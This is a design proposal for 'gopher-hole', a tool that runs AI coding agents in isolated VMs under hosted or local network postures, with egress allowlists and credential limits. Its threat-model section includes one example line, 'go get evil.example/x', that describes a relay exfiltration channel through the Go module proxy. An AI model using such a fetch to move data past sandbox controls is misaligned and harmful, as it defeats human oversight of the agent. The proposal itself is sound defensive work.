gopher-hole: one tool, two postures

Proposal · 2026-08-17 · combines attempt-004 (local model) and attempt-005 (hosted harnesses)

Background

Attempts 4 and 5 both work well, but they are two separate tools with three problems:

  • You must remember which tool targets the local model and which targets hosted models.
  • The two run.sh scripts take different arguments: attempt-004 takes [DIR] [CMD...], attempt-005 takes <harness>[:<provider>] [DIR] [CMD...].
  • Neither tool is on your PATH. You must know the attempt directory and run its script from there.

The two attempts already share most of their design. Both use Apple container (one lightweight VM per session). Both mount only the project directory, with .git read-only. Both run a root stage that installs a default-drop firewall, then drop to the non-root agent user. The differences are the egress mechanism, the credential handling, and the cache strategy — and attempt-005's providers.sh matrix is already the right structure to express all three.

This proposal merges the two attempts into a single tool named gopher-hole. The tool installs on the PATH. You run it from the project directory. With no arguments, it walks you through two questions: which agent? and where does inference run? The existing one-line invocation stays available for scripts and muscle memory.

Approach

Core idea: local inference becomes a provider

Attempt-005's matrix maps each harness to its valid providers, and each provider to its credential and its allowed egress hosts. Attempt-004's whole arrangement fits into that matrix as one new provider: lmstudio. The unified matrix becomes:

HarnessProviders (first = default)Source
pianthropic openai bedrock lmstudio custom005 + lmstudio from 004
claudeanthropic bedrock custom005 unchanged
codexopenai custom005 unchanged
opencodezen anthropic openai bedrock005 unchanged
ampamp005 unchanged
nonenone005 unchanged

The lmstudio provider starts on pi only, because that pairing is proven (it is attempt-004). The codex and opencode binaries each have a custom-endpoint mechanism that can likely point at LM Studio's OpenAI-compatible server; a later phase verifies those paths against the pinned binaries before the matrix admits them. This follows the repo's discipline: no matrix cell ships on documentation alone.

Posture follows the provider

The two attempts differ where their threat models differ. A hosted provider means a credential exists in the guest and exfiltration is possible by construction, so attempt-005 filters hostnames, logs egress, and lets the toolchain fetch through the proxy. A local provider means no credential exists, and total egress lockdown is the prize, so attempt-004 closes everything except LM Studio and shares the host's Go module cache read-only instead of allowing fetches.

The unified tool keeps both postures and selects one per session, derived from the provider:

Concernhosted posture (anthropic, openai, zen, amp, bedrock, custom)local posture (lmstudio, none)
Model egresstinyproxy hostname allowlist, CONNECT :443, uid-scoped nftablesOne direct nftables rule: LM Studio IPv4 + port only (none: no rule)
DNS for the agentNone (only tinyproxy resolves)None (no DNS at all)
Credential in guestExactly one capped key, per the matrixNo key exists
Toolchain fetchesproxy.golang.org, npm, etc. via proxy; guest-owned cachesClosed; host GOMODCACHE mounted read-only, GOPROXY=off
Egress reportPer-session summary from the proxy logNot needed (nothing to report)
Firewall failureFatal (a key is present)Fatal too — simpler than 004's warn-and-continue, and never wrong

Why the local posture does not reuse the proxy. Routing LM Studio traffic through tinyproxy would give uniform logging, but it buys nothing: the destination is one trusted machine you own, and the log exists to catch surprises. Worse, allowing toolchain hosts in local mode would reopen a relay exfiltration channel (go get evil.example/x makes the Go proxy fetch from the attacker's server) — precisely the channel attempt-004 exists to close. So the local posture keeps attempt-004's arrangement verbatim: direct IP rule, read-only host module cache, nothing else.

One command on the PATH, wizard by default

The tool moves to the repo root — it graduates from "attempt" to "the tool", which matches the repo's name. The attempts stay untouched as the historical record. make install symlinks the entry script into ~/bin (or /usr/local/bin when ~/bin is absent from PATH). 

# from any project directory:
gopher-hole                         # wizard: pick agent, pick inference, launch here
gopher-hole pi:lmstudio             # skip the wizard: explicit pair, project = cwd
gopher-hole claude ~/src/other      # explicit pair, explicit directory
gopher-hole review                  # hunk diff of this project, keyless sandbox
gopher-hole shell                   # keyless sandbox shell (was: run.sh none)
gopher-hole image | verify | clean  # maintenance (also make targets)

The wizard runs when no harness argument is given and stdin is a TTY. It asks the two questions in your stated order — agent first, then inference — and annotates every option with what it means for credentials, so the "which tool was for what?" question disappears: 

$ gopher-hole
gopher-hole — isolated agent session
project: ~/code/src/github.com/mdw-tools/some-project

Which agent?
  1. pi         2. claude     3. codex
  4. opencode   5. amp        6. none (sandbox shell)
agent [pi]: 2

Where does inference run?  (claude)
  1. hosted — anthropic     ANTHROPIC_API_KEY ✓ set
  2. hosted — bedrock       AWS_BEARER_TOKEN_BEDROCK ✗ not set
  3. hosted — custom        CUSTOM_BASE_URL ✗ not set
inference [anthropic]: 1

  session   claude → api.anthropic.com (hosted posture)
  credential ANTHROPIC_API_KEY (this key only; nothing else enters the guest)
  mounts    ~/code/.../some-project  (.git read-only)
launch? [Y/n]

Two wizard behaviors carry the weight:

  • Credential annotation. Each hosted option shows its required env var and whether the var is set in your host shell. The local option shows "no API key enters the guest."
  • LM Studio detection. When a harness supports lmstudio, the wizard probes http://${LMSTUDIO_HOST:-localhost}:1234/v1/models (1-second timeout) and labels the option "detected, N models loaded" or "not detected". You see before launch whether the local path will work.

Non-interactive invocations (a harness argument given, or stdin not a TTY) never prompt. verify.sh and scripts keep working unchanged.

CLI grammar (final)

gopher-hole [<harness>[:<provider>]] [PROJECT_DIR] [COMMAND...]
gopher-hole review [PROJECT_DIR]        # = none + hunk diff
gopher-hole shell  [PROJECT_DIR]        # = none + bash
gopher-hole image | verify | clean      # maintenance
gopher-hole --dry-run ...               # print the container invocation, do not run

All attempt-005 environment overrides keep their names (MODEL, EGRESS_EXTRA_HOSTS, SAFE_PROMPTS, GOPHER_STATE_DIR, Bedrock and custom variables). Attempt-004's LMSTUDIO_HOST, LMSTUDIO_PORT, LMSTUDIO_DEFAULT_MODEL, and SHARE_GO_CACHE apply when the provider is lmstudio. EGRESS_ALLOW_VCS dies: in the hosted posture the toolchain hosts already flow through the proxy, and in the local posture the answer is a deliberate EGRESS_EXTRA_HOSTS-style widening we choose not to port — fetch on the host instead.

--dry-run is not only a convenience. It prints the exact container run invocation (with credential names, never values) and exits. It is how the wizard and the argument parser get deterministic tests: feed choices on stdin, assert the printed command.

Trade-offs and open questions

  • Two postures in one firewall script. More branches than either attempt had. Mitigation: the branch point is one provider_posture() call, and verify.sh asserts both postures independently — including the negative claims (local: no DNS, no 443; hosted: agent cannot read the ruleset or the filter file).
  • lmstudio starts pi-only. codex:lmstudio and opencode:lmstudio look reachable through each tool's custom-endpoint route, but neither is verified against the pinned binaries yet. Phase 7 does that verification; the matrix admits a pair only after it passes.
  • Attempts 4 and 5 stay frozen. Their code is duplicated into the root, not moved. This keeps the historical record intact at the cost of dead-looking duplication. Their READMEs get a one-line pointer to the root tool.
  • The wizard is bash. A Go TUI would be prettier, but the wizard must share providers.sh (the single source of truth, sourced in-guest too), and numbered menus need nothing beyond read. Bash 3.2 compatibility on the host side is a hard constraint and already the house style.
  • Losing 004's warn-and-continue on firewall failure. A keyless local session that continued without rules was harmless; failing closed instead costs a retry in a rare failure mode and removes a whole class of "which posture am I in?" ambiguity. Accepted.
  • Open question: should gopher-hole verify run the full 400-line suite by default? Proposal: yes, with section arguments passed through (gopher-hole verify matrix firewall), same as today's verify.sh.
